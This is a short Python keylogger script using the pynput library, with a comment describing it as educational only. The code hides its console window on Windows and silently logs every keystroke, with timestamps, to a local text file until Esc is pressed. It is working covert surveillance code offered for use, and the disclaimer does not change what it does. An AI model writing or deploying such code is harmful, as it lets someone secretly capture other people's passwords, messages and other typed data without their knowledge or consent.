# Note : this is just for educational purpose only so use it ethically, do not try to theft/steal other's credentials.
# You need to install all of these libraries on your device
from pynput import keyboard
from datetime import datetime
import os
import sys
import ctypes

# OPTIONAL: Hide console window (Windows only)
def hide_console():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)  # 0 = HIDE, 5 = SHOW
        ctypes.windll.kernel32.CloseHandle(whnd)

# Call hide_console() only if running as script, not in IDE
if not hasattr(sys, 'ps1'):
    hide_console()

# Log file path
log_file = "key_log.txt"
# To stop the key logger you need to press esc key on your laptop/pc
stop_key = keyboard.Key.esc
# Note : numbers typed from numpad will not be stored.
def on_press(key):
    time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        key_data = f"{time_stamp} - {key.char}\n"
    except AttributeError:
        key_data = f"{time_stamp} - [{key}]\n"
    with open(log_file, "a") as f:
        f.write(key_data)

def on_release(key):
    if key == stop_key:
        return False  # Stop the listener

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
